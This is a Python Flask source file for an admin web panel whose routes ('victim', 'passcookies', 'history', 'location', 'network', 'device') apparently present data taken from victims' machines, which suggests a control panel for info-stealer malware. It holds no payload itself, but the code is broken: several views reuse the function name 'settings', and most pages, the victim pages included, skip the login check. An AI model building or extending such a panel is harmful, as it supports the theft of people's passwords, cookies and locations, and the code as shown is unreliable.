from flask import Flask, render_template, request, redirect, url_for, session, flash, send_from_directory
import os, pymysql, re, traceback, logging
from bcrypt import hashpw, gensalt, checkpw
from datetime import timedelta
from pymysql.cursors import DictCursor
from config import database_connection

app = Flask(__name__)
app.secret_key = os.urandom(24)

app.permanent_session_lifetime = timedelta(minutes=30)

logging.basicConfig(level=logging.DEBUG)

def get_db_connection():
    return pymysql.connect(**database_connection)

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = get_db_connection()
        cursor = conn.cursor(DictCursor)
        cursor.execute("SELECT id, username, password FROM list_admin WHERE username = %s", (username,))
        user = cursor.fetchone()
        conn.close()

        if user and checkpw(password.encode('utf-8'), user['password'].encode('utf-8')):
            session['id'] = user['id']
            session['username'] = user['username']
            return redirect(url_for('dashboard'))
        else: 
            return render_template('login.html', error='Username atau Password salah')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/victim')
def victim():
    return render_template('victim.html')

@app.route('/settings')
def settings():
    return render_template('settings.html')

@app.route('/overview')
def device():
    return render_template('overview.html')

@app.route('/device')
def settings():
    return render_template('device.html')

@app.route('/history')
def settings():
    return render_template('history.html')

@app.route('/network')
def settings():
    return render_template('network.html')

@app.route('/location')
def settings():
    return render_template('location.html')

@app.route('/passcookies')
def settings():
    return render_template('passcookies.html')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.static_folder, filename)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
